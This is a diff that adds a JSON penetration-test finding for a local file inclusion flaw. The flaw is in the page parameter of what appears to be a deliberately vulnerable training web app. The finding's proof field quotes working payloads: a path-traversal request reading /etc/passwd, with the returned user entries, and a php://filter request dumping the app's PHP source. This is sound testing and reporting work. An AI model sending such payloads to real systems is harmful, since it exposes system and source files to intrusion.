@@ -1,0 +1,10 @@
+{
+  "title": "Local File Inclusion (LFI) via page parameter",
+  "location": "/vulnerabilities/fi",
+  "severity": "high",
+  "proof": "GET /vulnerabilities/fi/?page=../../../../../etc/passwd returned root:x:0:0:root:/root:/bin/bash and other system users. Also php://filter/read=convert.base64-encode/resource=../../vulnerabilities/fi/source/low.php returned base64-encoded source confirming no input sanitization ($file = $_GET['page']).",
+  "stage": "class_probe",
+  "precondition": "Authenticated session (low security level)",
+  "affected_actor": "admin",
+  "affected_resource": "vulnerability"
+}
